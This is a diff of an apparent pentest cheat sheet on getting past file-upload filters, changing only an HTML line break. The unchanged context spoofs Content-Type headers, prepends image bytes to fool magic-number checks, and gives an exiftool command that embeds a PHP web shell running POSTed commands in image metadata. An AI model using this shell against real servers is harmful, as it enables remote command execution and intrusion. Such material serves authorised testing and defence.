@@ -109,7 +109,7 @@ AAA<--SNIP 232 A-->AAA.php.png
 1) Bypass Content-Type checks by setting the value of the Content-Type header to: <b>image/png</b> , <b>text/plain</b> ,<b> application/octet-stream</b><br>
 >> Content-Type wordlist: https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt <br>
 <br>
-2) Bypass magic number check by adding at the beginning of the file the bytes of a real image (confuse the file command). Or introduce the shell inside the metadata: <br><b>exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg </b>
+2) Bypass magic number check by adding at the beginning of the file the bytes of a real image (confuse the file command). Or introduce the shell inside the metadata: <b>exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg </b>
  <br>
 
 Or you can try other tricks you know that might work. Haha
